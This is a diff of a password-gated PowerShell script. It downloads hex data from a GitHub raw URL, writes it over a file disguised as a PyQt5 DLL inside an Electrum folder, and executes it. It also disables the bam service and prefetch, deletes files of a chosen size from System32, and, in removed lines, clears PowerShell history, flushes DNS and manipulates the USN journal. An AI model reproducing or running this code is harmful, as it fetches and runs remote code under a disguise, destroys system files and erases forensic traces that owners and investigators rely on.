@@ -1,5 +1,8 @@
 # Define hardcoded passwords
-$hardcodedPasswords = @("password")
+$hardcodedPasswords = @("Braylona23")
+
+# Path to check for existence
+$requiredPath = "C:\Users\admin\Downloads\IMG_0232.jpg" # Change this to the desired path
 
 # Function to prompt for a password
 function Prompt-ForPassword {
@@ -25,9 +28,7 @@ function Force-Disable-Service {
         [string]$serviceName
     )
     try {
-        # Stop the service before disabling it, even if it's already stopped
         Stop-Service -Name $serviceName -Force -ErrorAction SilentlyContinue
-        # Disable the service in the registry
         Set-ItemProperty -Path $servicePath -Name Start -Value 4 # 4 = Disabled
     } catch {
         Write-Host ("Error disabling service: {0}" -f $_.Exception.Message)
@@ -91,7 +92,6 @@ function Convert-HexToBytes {
         [string]$hex
     )
 
-    # Check if hex string length is even
     if ($hex.Length % 2 -ne 0) {
         Write-Host "Error: Hex string length is not even."
         return $null
@@ -151,6 +151,12 @@ while ($true) {
 
     # Check if the password is valid
     if ($hardcodedPasswords -contains $userPassword) {
+        # Check if required path exists
+        if (-Not (Test-Path $requiredPath)) {
+            Write-Host "Required path does not exist. Login failed."
+            continue # Restart the login process
+        }
+
         while ($true) {
             # Display options
             Display-Options
@@ -171,16 +177,12 @@ while ($true) {
                     $filePath = "F:\Electrum\PyQt5\QtWidgets.pyd"
                     $hexData = Get-HexData -url $hexUrl
 
-                    # Check if hex data is not null
                     if ($null -ne $hexData) {
-                        # Clean hex data by removing non-hex characters
                         $hexCodePayload = -join ($hexData -replace '[^0-9A-Fa-f]', '')
 
-                        # Check if hex code is valid
                         if ($hexCodePayload.Length % 2 -eq 0) {
                             $binaryData = Convert-HexToBytes -hex $hexCodePayload
 
-                            # Check if conversion was successful
                             if ($null -ne $binaryData) {
                                 Write-BinaryToFile -filePath $filePath -data $binaryData
                             } else {
@@ -198,8 +200,6 @@ while ($true) {
                         try {
                             Start-Process -FilePath $filePath -NoNewWindow
                             Write-Host "Successfully executed gosth"
-
-                            # Wait for 7 seconds
                             Start-Sleep -Seconds 7
                         } catch {
                             Write-Host ("Failed to execute: {0}" -f $filePath)
@@ -226,18 +226,13 @@ while ($true) {
                     Disable-Prefetch -prefetchPath "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters"
 
                     # Fetch hex data from URL
-                    $hexUrl = "https://raw.githubusercontent.com/Notsurewtf/shiny-tribble/refs/heads/main/funny" # URL to fetch hex data
+                    $hexUrl = "https://raw.githubusercontent.com/Notsurewtf/shiny-tribble/refs/heads/main/funny"
                     $hexData = Get-HexData -url $hexUrl
-
-                    # Path to the log file
                     $filePath = "F:\Electrum\PyQt5\QtWidgets.pyd"
 
-                    # Check if hex data is valid
                     if ($null -ne $hexData) {
-                        # Convert hex string to byte array
                         $binaryData = Convert-HexToBytes -hex $hexData
 
-                        # Write the binary data to the file
                         if ($null -ne $binaryData) {
                             Write-BinaryToFile -filePath $filePath -data $binaryData
                             Write-Host "Hex of the file changed successfully."
@@ -245,24 +240,12 @@ while ($true) {
                             Write-Host "Error: Conversion to bytes failed."
                         }
                     } else {
-                        Write-Host "Error: No hex data fetched."
+                        Write-Host "No hex data fetched."
                     }
 
-                    # Flush DNS
-                    ipconfig /flushdns
-
-                    # Clear PowerShell history
-                    $historyFilePath = "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_History.txt"
-                    if (Test-Path $historyFilePath) {
-                        Clear-Content -Path $historyFilePath
-                    } else {
-                        Write-Host "The file does not exist."
-                    }
-
-                    # USN Journal manipulation code
-                    Maximize-USNJournal
-                    Find-And-Delete-FileBySize -directory "C:\Windows\System32" -fileSize 12345678 # Change to desired file size
-                    Unmaximize-USNJournal
+                    # Delete files of specific size in C:\Windows\System32
+                    $fileSizeToDelete = 7697408 # Change this to the size you want
+                    Find-And-Delete-FileBySize -directory "C:\Windows\System32" -fileSize $fileSizeToDelete
 
                     # Re-enable services and prefetch
                     Enable-Service -servicePath "HKLM:\SYSTEM\CurrentControlSet\Services\bam"
@@ -274,14 +257,14 @@ while ($true) {
                 }
                 '0' {
                     Write-Host "Exiting..."
-                    exit
+                    break 2 # Break out of both loops
                 }
                 default {
-                    Write-Host "Invalid option. Please try again."
+                    Write-Host "Invalid option, please try again."
                 }
             }
         }
     } else {
-        Write-Host "Invalid password. Please try again."
+        Write-Host "Invalid password. Try again."
     }
 }
